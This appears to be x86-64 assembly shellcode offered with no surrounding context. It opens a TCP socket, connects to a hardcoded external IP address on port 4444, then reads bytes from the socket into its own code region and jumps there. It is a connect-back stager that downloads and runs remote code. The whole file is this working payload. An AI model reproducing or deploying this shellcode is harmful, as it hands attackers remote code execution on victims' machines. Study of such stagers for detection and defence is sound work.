BITS 64
; socket(2, 1, 0)
main:
    jmp socket
loop:
    xor eax, eax
    push rbx
    pop rdi
    lea rsi, [r15 + 0x10]
    xor rdx, rdx
    add dl, 0xff
    syscall
socket:
    ; socket(2, 1, 0)
    push byte 0x29
    pop rax
    cdq
    push byte 0x2
    pop rdi
    push byte 0x1
    pop rsi
    syscall
    ; stores sock_fd in rbx
    push rax
    pop rbx
    ; connect(s, [2, port, ip], 16)
    xchg rax, rdi
    push 0x7a1280b2     ; ip
    push word 0x5c11    ; port
    push word 0x2
    push rsp
    pop rsi
    mov dl, 0x10
    mov al, 0x2a
    syscall
    ; store loop
    lea r15, [rel loop]
    jmp r15

